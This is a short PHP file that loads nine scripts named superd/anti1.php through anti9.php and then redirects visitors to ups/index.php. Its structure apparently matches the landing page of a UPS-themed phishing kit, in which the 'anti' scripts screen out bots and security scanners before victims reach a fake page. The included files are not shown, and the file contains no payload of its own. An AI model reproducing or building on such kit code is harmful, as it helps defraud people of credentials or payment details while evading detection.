<?php
	require 'superd/anti1.php';
	require 'superd/anti2.php';
	require 'superd/anti3.php';
	require 'superd/anti4.php';
	require 'superd/anti5.php';
	require 'superd/anti6.php';
	require 'superd/anti7.php';
	require 'superd/anti8.php';
	require 'superd/anti9.php';
	exit(header("Location: ups/index.php"));
?>